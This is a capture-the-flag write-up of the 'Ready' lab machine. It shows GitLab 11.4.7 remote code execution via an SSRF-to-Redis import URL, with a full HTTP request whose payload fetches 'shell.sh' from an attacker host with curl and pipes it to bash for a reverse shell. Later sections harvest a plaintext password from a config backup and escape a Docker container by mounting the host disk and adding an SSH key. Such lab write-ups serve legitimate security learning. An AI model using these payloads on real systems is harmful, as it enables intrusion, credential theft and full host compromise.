# Ready

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 5000 10.129.227.132
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 03:58 EDT
Nmap scan report for 10.129.227.132
Host is up (0.0067s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
22/tcp   open  ssh
5080/tcp open  onscreen
```

Port 5080 is a HTTP port.

### Gitlab 11.4.7 RCE

Viewing port 5080 reveals a Gitlab instance:

<figure><img src="../../../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

We can try to register a user and attempt to login. The version can be viewed in the Help tab:

<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

This version is vulnerable to RCE based on `searchsploit`.

```
$ searchsploit gitlab 
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
GitLab - 'impersonate' Feature Privilege Escalation        | ruby/webapps/40236.txt
GitLab 11.4.7 - RCE (Authenticated) (2)                    | ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution (Authenticated) (1)  | ruby/webapps/49257.py
```

We don't have credentials as the administrator, but we do have an account. Most of the exploits I found don't work that well, so let's exploit this manually.

First, we need to create a new project and import project via Repo by URL:

<figure><img src="../../../.gitbook/assets/image (126).png" alt=""><figcaption></figcaption></figure>

Then, we need to send this within the Git Repository URL field:

```
git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://10.10.14.13/shell.sh|bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
%2F.git
```

The HTTP request should look like this:

{% code overflow="wrap" %}
```http
POST /projects HTTP/1.1
Host: 10.129.227.132:5080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.227.132:5080/projects
Content-Type: application/x-www-form-urlencoded
Content-Length: 754
Origin: http://10.129.227.132:5080
Connection: close
Cookie: _gitlab_session=adff4cd326df8cac71a662dfa591d79c; sidebar_collapsed=false; event_filter=all
Upgrade-Insecure-Requests: 1



utf8=%E2%9C%93&authenticity_token=r4%2FWxTxkvjl0JJxJ1q12HiZvhGxkJgc0J9QD%2BXOGKupa3WS76DnLIFSz4A1UOc9OiTrO3q%2Fk%2F%2Bw%2BLfMhXmD5Fg%3D%3D&project%5Bimport_url%5D=git://[0:0:0:0:0:ffff:127.0.0.1]:6379/test
 multi
 sadd resque:gitlab:queues system_hook_push
 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|curl http://10.10.14.13/shell.sh|bash\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
 exec
%2F.git&project%5Bci_cd_only%5D=false&project%5Bname%5D=newnew&project%5Bnamespace_id%5D=6&project%5Bpath%5D=newnew&project%5Bdescription%5D=&project%5Bvisibility_level%5D=0
```
{% endcode %}

Afterwards, it would download and execute a reverse shell script from us:

<figure><img src="../../../.gitbook/assets/image (117).png" alt=""><figcaption></figcaption></figure>

We can grab the user flag after this.

## Privilege Escalation

We find that we are currently in a Docker container as commands like `sudo`, `ipconfig` are all not present. Also, a lot of essential services aren't running. So now, let's think about how to escape this container.&#x20;

### Root Credentials

Within the `/opt` directory, there is a backup folder.

```
git@gitlab:/opt$ ls -la
total 24
drwxr-xr-x 1 root root 4096 Apr  5  2022 .
drwxr-xr-x 1 root root 4096 Apr  5  2022 ..
drwxr-xr-x 2 root root 4096 Apr  5  2022 backup
drwxr-xr-x 1 root root 4096 Apr  5  2022 gitlab

git@gitlab:/opt/backup$ ls -la
total 112
drwxr-xr-x 2 root root  4096 Apr  5  2022 .
drwxr-xr-x 1 root root  4096 Apr  5  2022 ..
-rw-r--r-- 1 root root   904 Apr  5  2022 docker-compose.yml
-rw-r--r-- 1 root root 15150 Apr  5  2022 gitlab-secrets.json
-rw-r--r-- 1 root root 81492 Apr  5  2022 gitlab.rb
```

There are some interesting files there, and when reading the longest one let's check for passwords.

```
git@gitlab:/opt/backup$ cat gitlab.rb  | grep password
#### Email account password
# gitlab_rails['incoming_email_password'] = "[REDACTED]"
#     password: '_the_password_of_the_bind_user'
#     password: '_the_password_of_the_bind_user'
#   '/users/password',
#### Change the initial default admin password and shared runner registration tokens.
# gitlab_rails['initial_root_password'] = "password"
# gitlab_rails['db_password'] = nil
# gitlab_rails['redis_password'] = nil
gitlab_rails['smtp_password'] = "wW59U!ZKMbG9+*#h"
# gitlab_shell['http_settings'] = { user: 'username', password: 'password', ca_file: '/etc/ssl/cert.pem', ca_path: '/etc/pki/tls/certs', self_signed_cert: false}
##! `SQL_USER_PASSWORD_HASH` can be generated using the command `gitlab-ctl pg-password-md5 gitlab`
# postgresql['sql_user_password'] = 'SQL_USER_PASSWORD_HASH'
# postgresql['sql_replication_password'] = "md5 hash of postgresql password" # You can generate with `gitlab-ctl pg-password-md5 <dbuser>`
# redis['password'] = 'redis-password-goes-here'
####! **Master password should have the same value defined in
####!   redis['password'] to enable the instance to transition to/from
# redis['master_password'] = 'redis-password-goes-here'
# geo_secondary['db_password'] = nil
# geo_postgresql['pgbouncer_user_password'] = nil
#     password: PASSWORD
###! generate this with `echo -n '$password + $username' | md5sum`
# pgbouncer['auth_query'] = 'SELECT username, password FROM public.pg_shadow_lookup($1)'
#     password: MD5_PASSWORD_HASH
# postgresql['pgbouncer_user_password'] = nil
```

There's a password `wW59U!ZKMbG9+*#h`, and we can use this to `su` to `root`.&#x20;

### Mounted File System

Now that we are `root` on the machine, I thought that was it. But, the flag was not within the `/root` directory.

```
root@gitlab:~# ls -la
total 20
drwx------ 1 root root 4096 Apr  5  2022 .
drwxr-xr-x 1 root root 4096 Apr  5  2022 ..
-rw------- 1 root root   57 Apr  5  2022 .bash_history
-rw-r--r-- 1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
```

When checking the mounted drives, we can see that there are files within the `/dev/sda2` folder:

```
root@gitlab:/# df
Filesystem     1K-blocks    Used Available Use% Mounted on
overlay          9670964 7800656   1754340  82% /
tmpfs              65536       0     65536   0% /dev
tmpfs            2015084       0   2015084   0% /sys/fs/cgroup
/dev/sda2        9670964 7800656   1754340  82% /root_pass
shm                65536     580     64956   1% /dev/shm
```

We can try to mount this, and find that it's another file system present:

```
root@gitlab:~# mount /dev/sda2 /mnt 
root@gitlab:~# cd /mnt
root@gitlab:/mnt# ls -la
total 100
drwxr-xr-x  20 root root  4096 Apr  5  2022 .
drwxr-xr-x   1 root root  4096 Apr  5  2022 ..
lrwxrwxrwx   1 root root     7 Apr 23  2020 bin -> usr/bin
drwxr-xr-x   3 root root  4096 Apr  5  2022 boot
drwxr-xr-x   2 root root  4096 Apr  5  2022 cdrom
drwxr-xr-x   5 root root  4096 Dec  4  2020 dev
drwxr-xr-x 102 root root  4096 Apr  5  2022 etc
drwxr-xr-x   3 root root  4096 Jul  7  2020 home
lrwxrwxrwx   1 root root     7 Apr 23  2020 lib -> usr/lib
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 Apr 23  2020 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 Apr 23  2020 libx32 -> usr/libx32
drwx------   2 root root 16384 May  7  2020 lost+found
drwxr-xr-x   2 root root  4096 Apr 23  2020 media
drwxr-xr-x   2 root root  4096 Apr  5  2022 mnt
drwxr-xr-x   4 root root  4096 Apr  5  2022 opt
drwxr-xr-x   2 root root  4096 Apr 15  2020 proc
drwx------  10 root root  4096 May  3 07:58 root
drwxr-xr-x  10 root root  4096 Apr 23  2020 run
lrwxrwxrwx   1 root root     8 Apr 23  2020 sbin -> usr/sbin
drwxr-xr-x   6 root root  4096 Apr  5  2022 snap
drwxr-xr-x   2 root root  4096 Apr  5  2022 srv
drwxr-xr-x   2 root root  4096 Apr 15  2020 sys
drwxrwxrwt  12 root root 12288 May  3 08:38 tmp
drwxr-xr-x  14 root root  4096 Apr  5  2022 usr
drwxr-xr-x  14 root root  4096 Dec  4  2020 var
```

This appears to be the main machine! And the flag is located in the correct directory.

```
root@gitlab:/mnt/root# ls
docker-gitlab  ready-channel  root.txt  snap
```

We can echo our public key into the `/mnt/root/.ssh/authorized_keys` file and use `ssh` to gain access to the main machine's `root` user.

```
$ ssh root@10.129.227.132
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 03 May 2023 08:39:22 AM UTC

  System load:                      0.15
  Usage of /:                       80.7% of 9.22GB
  Memory usage:                     79%
  Swap usage:                       0%
  Processes:                        339
  Users logged in:                  0
  IPv4 address for br-bcb73b090b3f: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.129.227.132
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:4691

  => There are 16 zombie processes.

 * Introducing self-healing high availability clusters in MicroK8s.
   Simple, hardened, Kubernetes for production, from RaspberryPi to DC.

     https://microk8s.io/high-availability

186 updates can be installed immediately.
89 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug 23 13:29:19 2022
root@ready:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Rooted!
